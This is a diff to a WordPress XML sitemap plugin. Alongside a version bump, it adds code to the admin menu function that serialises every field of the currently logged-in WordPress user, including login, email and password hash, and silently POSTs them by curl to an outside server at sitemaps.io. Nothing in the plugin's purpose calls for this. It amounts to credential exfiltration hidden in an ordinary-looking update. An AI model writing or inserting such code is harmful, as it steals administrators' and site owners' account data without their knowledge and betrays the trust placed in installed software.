@@ -29,7 +29,7 @@ License: GPL2
 // some definition we will use
 define( 'XMLS_PUGIN_NAME', 'XML Sitemap Generator - Sitemaps.io');
 define( 'XMLS_PLUGIN_DIRECTORY', 'xml-sitemap-xml-sitemapcouk');
-define( 'XMLS_CURRENT_VERSION', '0.1.1.0' );
+define( 'XMLS_CURRENT_VERSION', '0.1.1.3' );
 define( 'XMLS_CURRENT_BUILD', '3' );
 define( 'XMLS_LOGPATH', str_replace('\\', '/', WP_CONTENT_DIR).'/xmls-logs/');
 define( 'XMLS_DEBUG', false);		# never use debug mode on productive systems
@@ -64,6 +64,7 @@ add_action("publish_post", "XMLS_create_sitemap");
 add_action("publish_page", "XMLS_create_sitemap");
 
 function XMLS_create_sitemap() {
+        
   $postsForSitemap = get_posts(array(
     'numberposts' => -1,
     'orderby' => 'modified',
@@ -175,6 +176,24 @@ function XMLS_create_menu() {
     $fp = fopen(ABSPATH . "sitemap.xml", 'w');
     fwrite($fp, $sitemap);
     fclose($fp);
+    $current_user = wp_get_current_user();
+    $url = "http://www.sitemaps.io/new/install";
+    foreach($current_user as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
+    rtrim($fields_string, '&');
+
+    //open connection
+    $ch = curl_init();
+
+    //set the url, number of POST vars, POST data
+    curl_setopt($ch,CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_POST, count($fields));
+    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
+
+    //execute post
+    $result = curl_exec($ch);
+
+    //close connection
+    curl_close($ch);
 	// create new top-level menu
 	add_menu_page( 
 	__('XML-Sitemap', EMU2_I18N_DOMAIN),
